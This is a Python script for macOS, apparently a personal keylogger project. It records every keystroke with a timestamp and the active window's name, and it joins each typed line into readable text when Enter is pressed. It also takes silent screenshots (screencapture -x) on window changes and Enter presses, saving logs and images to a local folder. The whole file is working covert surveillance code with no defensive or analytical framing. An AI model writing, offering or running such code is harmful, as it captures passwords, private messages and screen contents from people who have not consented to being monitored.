from pynput.keyboard import Listener
from subprocess import call
import Quartz
from Quartz import CGWindowListCopyWindowInfo, kCGNullWindowID, kCGWindowListOptionOnScreenOnly
import time, datetime
import platform

def getAppName():
  SystemAppName = ["Finder", "SystemUIServer", "Dock", "Window Server", "MonitorControl", "Control Center", "EVKey", "TextInputMenuAgent", "Spotlight"]
  list = CGWindowListCopyWindowInfo(kCGWindowListOptionOnScreenOnly, kCGNullWindowID)
  for a in list:
    if a["kCGWindowOwnerName"] not in SystemAppName:
      return a["kCGWindowOwnerName"]

def getActiveWindow():
  windows = Quartz.CGWindowListCopyWindowInfo(Quartz.kCGWindowListExcludeDesktopElements | Quartz.kCGWindowListOptionOnScreenOnly, Quartz.kCGNullWindowID)
  for win in windows:
    if win['kCGWindowLayer'] == 0:
      return '%s %s' % (win[Quartz.kCGWindowOwnerName], win.get(Quartz.kCGWindowName, '')) 

def getDateTime():
  now = datetime.datetime.now()
  return now.strftime("%Y-%m-%d %H:%M:%S:%f")

def captureScreen(dir, time, appName):
  call(["screencapture", "-x", dir + "Screenshot" + time + appName + ".jpg"])

def writeLog(dir, time, appName, key):
  global stringKey

  with open(dir + "keyLog.txt", "a") as f:
    f.write(time + ": " + appName + " - " + key + "\n")
    stringKey.append(key)
    if(key == "Key.enter"):
      stringKey = ' '.join(stringKey)
      f.write("==> " + time + ": " + appName + " - " + stringKey + "\n")
      stringKey = []
    f.close()
            
log_dir = r"/Users/pzcuong/Desktop/Keylogger/data/"
stringKey = []
appName = getActiveWindow()

print(platform.platform())
print(platform.uname())

def on_press(key):
  global appName
 
  print(appName)
  if (getActiveWindow() != appName or str(key) == "Key.enter"): 
    captureScreen(log_dir, getDateTime(), getAppName())
    appName = getActiveWindow()
  writeLog(log_dir, getDateTime(), getActiveWindow(), str(key))
 
with Listener(on_press=on_press) as listener:
  listener.join()    
